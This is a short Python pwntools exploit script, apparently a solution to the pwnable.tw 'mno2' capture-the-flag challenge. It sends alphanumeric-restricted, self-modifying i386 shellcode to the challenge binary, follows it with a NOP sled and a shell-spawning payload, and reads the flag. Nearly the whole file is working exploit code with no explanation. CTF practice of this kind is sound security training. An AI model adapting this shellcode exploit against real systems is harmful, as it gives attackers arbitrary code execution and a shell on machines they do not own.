#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10301
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./mno2', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x080487DF
            b* 0x080487E8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
shellcode = asm('''
	push   eax
    pop    ecx
    inc    edx
    push   0x30303030  
    pop    eax
    gs inc edx
    xor    eax,0x30303030
    dec    eax
    inc    edx
    push   0x30303030
    xor   byte ptr [ecx+0x67],al
    inc    ecx
    addr16 inc edx
    push   0x30303030
    xor   byte ptr [ecx+0x67],al
    inc    edx
    push   0x30303030
    pop    eax
    gs inc edx
    push   0x30303030
    xor    byte ptr [ecx+0x67],al
    xor    eax,0x30303033
	''', arch='i386')
shellcode += b'NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN2O'
# GDB()
p.sendline(shellcode)
p.sendline(b'\x90'*0x6a + asm(shellcraft.sh()))

p.sendline(b'cat /home/mno2/flag')

p.interactive()